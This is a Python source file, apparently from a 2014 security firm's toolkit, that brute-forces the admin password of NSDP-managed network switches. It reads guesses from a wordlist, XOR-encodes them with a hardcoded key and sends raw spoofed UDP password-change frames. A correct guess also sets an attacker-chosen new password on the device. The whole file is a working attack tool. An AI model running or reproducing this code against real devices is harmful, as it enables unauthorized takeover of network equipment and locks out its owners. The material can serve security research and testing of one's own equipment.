#!/usr/bin/env python3
#The MIT License (MIT)
#
#Copyright (c) 2014 Curesec GmbH <https://www.curesec.com>
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in
#all copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
#THE SOFTWARE.

import socket
import sys
import fcntl
import struct 
import binascii
import threading
import select
import time

import network

from struct import *

"""NSDP Discover class
    :platform: Linux

"""

class NSDPPasswordBruteForce():
    
    def __init__(self, network, port, password, macaddress, fd, quiet):
        self.network = network
        self.port = port
        self.password = password
        self.macaddress = macaddress
        self.fd = fd
        self.found = False
        self.pw = ""
        self.pw_found_flag = False
        self.quiet = quiet

    def bruteforce_sniffer(self, e):
        s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s1.bind(('0.0.0.0', self.port))
        s2 = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s2.bind(('0.0.0.0', self.port))

        pw_count = 0

        print("[bruteforce thread] thread started")

        while True:
            r, w, x = select.select([s1, s2], [], [])
            for i in r:
                packet = i.recvfrom(131072)
                packet = packet[0]
                eth_length = 14

                ip_header = packet[0:20]
                iph = unpack('!BBHHHBBH4s4s' , ip_header)

                version_ihl = iph[0]
                version = version_ihl >> 4
                ihl = version_ihl & 0xF

                iph_length = ihl * 4
         
                protocol = iph[6]
                s_addr = socket.inet_ntoa(iph[8])
                d_addr = socket.inet_ntoa(iph[9])

                if protocol == 17:
                    udph_length = 8
                    udp_header = packet[iph_length:iph_length+8]
                    udph = unpack('!HHHH' , udp_header)
                    source_port = udph[0]
                    dest_port = udph[1]
                    length = udph[2]
                    checksum = udph[3]

                    if source_port == self.port:
                        h_size = iph_length + udph_length
                        data_size = len(packet) - h_size
                        data = packet[h_size:]

                        if data[5] == 0xa:
                            pw_count += 1
                            if self.quiet == False: 
                                sys.stdout.write("\rpasswords tried: %i" % pw_count)
                                sys.stdout.flush()
                        else:
                            print("\npassword found: " + self.pw)
                            e.set()
                            return
    
                        e.set()

    def start_password_bruteforce(self):
        s = self.network.init_socket()
        
        packet = '';

        ip_header = self.network.generate_ip_header("UDP")

        e = threading.Event()
        t1 = threading.Thread(name='block', target=self.bruteforce_sniffer, args=(e,))
        t1.start()

        bf_password = self.fd.readline()

        while bf_password:
            e.clear()
            bf_password = bf_password.rstrip('\n')
            self.pw = bf_password
            udp_header, password_bruteforce_frame = self.generate_password_bruteforce_packet(bf_password)
            packet = ip_header + udp_header + password_bruteforce_frame
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, True)
            s.sendto(packet, (self.network.dest_ip , 0 ))
           
            if t1.is_alive():
                e.wait(3)
            else:
                return

            bf_password = self.fd.readline()
            while len(bf_password) > 21:
                bf_password = self.fd.readline()

       
    def generate_password_bruteforce_packet(self, bf_password):
        xor_bytes = bytes( [0x4e, 0x74, 0x67, 0x72,
                            0x53, 0x6d, 0x61, 0x72,
                            0x74, 0x53, 0x77, 0x69,
                            0x74, 0x63, 0x68, 0x52,
                            0x6f, 0x63, 0x6b, 0x4e]) 
      
        oldpassword = bf_password.encode("utf-8")
        newpassword = self.password.encode("utf-8")
        oldpassword_xor = bytes()
        newpassword_xor = bytes()
        oldpassword_len = pack("!B",len(bf_password))
        newpassword_len = pack("!B",len(self.password))

        mac = binascii.unhexlify(self.macaddress.replace(':', ''))

        for i in range(0,len(oldpassword)):
            oldpassword_xor += pack("!B", oldpassword[i] ^ xor_bytes[i])

        for i in range(0,len(newpassword)):
            newpassword_xor += pack("!B",newpassword[i] ^ xor_bytes[i])

        password_bruteforce_frame = bytes([0x01,0x03,0x00,0x00,0x00,0x00,
            0x00,0x00,0x08,0x00,0x27,0x47,0x56,0x16])
        password_bruteforce_frame += mac
        password_bruteforce_frame += bytes([0x00,0x00,0x00,0x0d,0x4e,0x53,0x44,0x50,0x00,
            0x00,0x00,0x00,0x00,0x0a,0x00])
        password_bruteforce_frame += oldpassword_len
        password_bruteforce_frame += oldpassword_xor
        password_bruteforce_frame += bytes([0x00,0x09,0x00])
        password_bruteforce_frame += newpassword_len
        password_bruteforce_frame += newpassword_xor
        password_bruteforce_frame += bytes([0xff,0xff,0x00,0x00])

        password_bruteforce_frame_length = 52 + len(bf_password) + len(self.password)

        udp_header = self.network.generate_udp_header(self.network.source_port, 
                self.network.dest_port, password_bruteforce_frame_length, 
                0, password_bruteforce_frame)

        return udp_header, password_bruteforce_frame

